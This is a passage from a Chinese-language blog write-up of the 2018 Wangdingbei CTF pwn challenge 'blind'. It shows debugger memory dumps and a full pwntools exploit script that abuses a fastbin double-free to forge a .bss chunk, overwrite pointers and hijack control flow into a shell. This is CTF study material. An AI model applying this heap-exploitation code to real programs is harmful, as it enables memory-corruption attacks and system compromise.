08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;00602000-00603000 rw-p 00002000 08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;0089c000-008bd000 rw-p 00000000 00:00 0                                  [heap]\n&apos;</span><br><span class="line">    &apos;7fabc8000000-7fabc8021000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabc8021000-7fabcc000000 ---p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabcf81a000-7fabcf830000 r-xp 00000000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcf830000-7fabcfa2f000 ---p 00016000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcfa2f000-7fabcfa30000 rw-p 00015000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcfa30000-7fabcfbf0000 r-xp 00000000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfbf0000-7fabcfdf0000 ---p 001c0000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf0000-7fabcfdf4000 r--p 001c0000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf4000-7fabcfdf6000 rw-p 001c4000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf6000-7fabcfdfa000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabcfdfa000-7fabcfe20000 r-xp 00000000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0002000-7fabd0005000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabd001e000-7fabd001f000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabd001f000-7fabd0020000 r--p 00025000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0020000-7fabd0021000 rw-p 00026000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0021000-7fabd0022000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7ffeca593000-7ffeca5b4000 rw-p 00000000 00:00 0                          [stack]\n&apos;</span><br><span class="line">    &apos;7ffeca5d2000-7ffeca5d5000 r--p 00000000 00:00 0                          [vvar]\n&apos;</span><br><span class="line">    &apos;7ffeca5d5000-7ffeca5d7000 r-xp 00000000 00:00 0                          [vdso]\n&apos;</span><br><span class="line">    &apos;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n&apos;</span><br><span class="line">Traceback (most recent call last):</span><br></pre></td></tr></table></figure></p>
<p>构造的虚假chunk，将bss段上的数据放到了unsorted bin中，<code>main_arena+88</code>的地址也被放到了bss段上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x602040</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007faaecc34540	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000602068	0x0000000000602060</span><br><span class="line">0x602070:	0x0000000001a93000	0x0000000000000101</span><br><span class="line">0x602080:	0x00007faaecc33b78	0x00007faaecc33b78</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>查看<code>main_arena+88</code>附近的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x00007faaecc33b00</span><br><span class="line">0x7faaecc33b00 &lt;__memalign_hook&gt;:	0x00007faaec8f4e20	0x00007faaec8f4a00</span><br><span class="line">//可以看到这里就是malloc_hook的地址,最后一个字节设置为0，且偏移为0x10处</span><br><span class="line">0x7faaecc33b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000001a930e0</span><br><span class="line">0x7faaecc33b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x0000000000602070</span><br><span class="line">0x7faaecc33b90 &lt;main_arena+112&gt;:	0x0000000000602070	0x00007faaecc33b88</span><br></pre></td></tr></table></figure></p>
<h2 id="利用代码-1"><a href="#利用代码-1" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./blind'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">		p.interactive()</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(where),flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">1</span>,p64(where)[:<span class="number">-1</span>],flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"><span class="comment"># new(2,'c'*10) #2</span></span><br><span class="line"></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">3</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x60203d</span>)</span><br><span class="line">change(<span class="number">2</span>,payload)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'c'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">5</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate fake chunk</span></span><br><span class="line"><span class="comment"># fake chunk size is 0x101, not in fastbin </span></span><br><span class="line">payload = <span class="string">'\x01\x01'</span>+<span class="string">'\x00'</span>*<span class="number">5</span></span><br><span class="line">chunk_base = <span class="number">0x602070</span></span><br><span class="line">write(chunk_base+<span class="number">0x8</span>,payload)</span><br><span class="line"><span class="comment"># 虚假chunk的下一个chunk的prev_size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>,p64(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment"># 虚假chunk的下一个chunk的size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>+<span class="number">0x8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="comment"># 虚假chunk的下下个chunk的size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>+<span class="number">0x20</span>+<span class="number">0x8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x602080</span>,p64(chunk_base+<span class="number">0x10</span>)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># change free_times to 0</span></span><br><span class="line">write(<span class="number">0x602098</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(<span class="number">0x602068</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x400c6e</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line">release(<span class="number">4</span>)</span><br><span class="line">new_write(<span class="number">0x602080</span>,<span class="string">''</span>)</span><br><span class="line">change(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0x4008e3</span>)[:<span class="number">-1</span>])</span><br><span class="line">new_write(<span class="number">0x602070</span>,p64(<span class="number">0x0</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">'aaa'</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/09/30/wangdingbei/网鼎杯-guess/" rel="next" title="网鼎杯-GUESS">
                <i class="fa fa-chevron-left"></i> 网鼎杯-GUESS
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/09/30/wangdingbei/网鼎杯pwn-babyheap/" rel="prev" title="网鼎杯-babyheap">
                网鼎杯-babyheap <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">e3pem</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯pwn-blind"><span class="nav-number">1.</span> <span class="nav-text">网鼎杯pwn-blind</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路——劫持FILE结构体"><span class="nav-number">1.2.</span> <span class="nav-text">利用思路——劫持FILE结构体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用代码"><span class="nav-number">1.3.</span> <span class="nav-text">利用代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于-IO-FILE的问题"><span class="nav-number">1.4.</span> <span class="nav-text">关于_IO_FILE的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路——劫持-malloc-hook"><span class="nav-number">1.5.</span> <span class="nav-text">利用思路——劫持__malloc_hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用代码-1"><span class="nav-number">1.6.</span> <span class="nav-text">利用代码</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">e3pem</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
